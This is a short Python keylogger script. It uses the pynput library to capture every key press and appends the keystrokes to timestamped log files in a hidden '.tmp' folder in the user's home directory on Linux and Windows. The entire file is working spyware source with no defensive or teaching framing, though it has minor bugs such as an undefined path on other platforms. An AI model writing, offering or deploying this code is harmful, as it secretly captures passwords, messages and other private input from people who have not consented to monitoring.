""" stores keystrokes in txt file
Listeners require memory allocation
'with' keyword releases memory automatically? """
import sys
import os
from datetime import datetime
from pynput.keyboard import Listener

NAME = str(os.getlogin())
DTT = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def write_to_file(key):
    """ writes key to file and cases out exceptions """
    character = str(key)
    character = character.replace("'", "")
    if len(character) == 1:
        pass
    if character == "Key.space":
        character = " "
    elif character == "Key.enter":
        character = "\n"
    elif character == "Key.shift_r" or character == "Key.shift_l":
        character = ""
    elif character == "Key.ctrl_l" or character == "Key.ctrl_r":
        character = " ctrl+"
    elif character == "Key.backspace":
        character = "^b"
    #else:
    #    character = "\n " + character + "\n"
    if sys.platform == 'linux':
        path = f"/home/{NAME}/.tmp"
        if not os.path.isdir(path):
            os.makedirs(path)

    if sys.platform == 'win32' or sys.platform == 'win64':
        path = f"C:/Users/{NAME}/.tmp"
        if not os.path.isdir(path):
            os.makedirs(path)

    with open(path + "/log-" + DTT + ".txt", "a") as file:
        file.write(character)

with Listener(on_press=write_to_file) as l:
    l.join()
